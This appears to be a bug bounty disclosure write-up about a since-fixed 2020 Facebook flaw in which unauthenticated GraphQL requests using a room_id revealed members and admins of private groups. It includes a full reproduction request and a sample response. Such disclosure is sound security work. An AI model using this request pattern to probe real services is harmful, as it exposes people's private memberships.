---
title: Disclosing Private Group Members via Facebook Rooms
description: In September 2020, a vulnerability was discovered in Facebook's Rooms feature inside Groups that allowed attackers to disclose members of private groups through unauthenticated GraphQL requests.
date: 2025-6-15 11:33:00 +0800
categories: [Meta bug bounty]
tags: [Meta]
pin: false
math: true
mermaid: true
---

## 🧾Description

In September 2020, a vulnerability was discovered in Facebook's Rooms feature inside Groups that allowed attackers to disclose members of private groups through unauthenticated GraphQL requests. By capturing or guessing the `room_id`, an attacker could access sensitive data revealing group membership and user identities.

---

## ⚙️ Steps to Reproduce

1. A user creates a Room inside a **private group**.
2. The `room_id` is exposed in the GraphQL response.
3. The attacker captures or guesses the `room_id`.
4. The attacker sends an unauthenticated GraphQL request:

**Request:**
```http
POST /api/graphql/ HTTP/1.1
Host: www.facebook.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0
Accept: */*
Content-Type: application/x-www-form-urlencoded
Connection: close

&doc_id=3147738971987452&variables={"room_link":"{room_id}"}
```

**Response:**
```json
{
  "data": {
    "link": {
      "admin_ids": ["123456789"],
      "link_owner": {
        "__typename": "User",
        "short_name": "UserA",
        "id": "123456789"
      },
      "link_surface": "GROUP",
      "link_container": {
        "__typename": "Group",
        "id": "987654321"
      }
    }
  }
}
```

**Key Points:**
- `admin_ids` → reveals the user ID of the room creator.
- `link_owner` → confirms the user identity.
- `link_container.id` → reveals the private group ID.

These fields confirm the target’s membership in the private group.

---

## Impact

- **Membership Disclosure:** Attackers can confirm which users belong to private groups.

---

## Timeline

- **Reported:** September 15, 2020  
- **Triaged:** September 22, 2020  
- **Fixed:** September 29, 2020  
- **Reward:** October 1, 2020 — $1,500

---
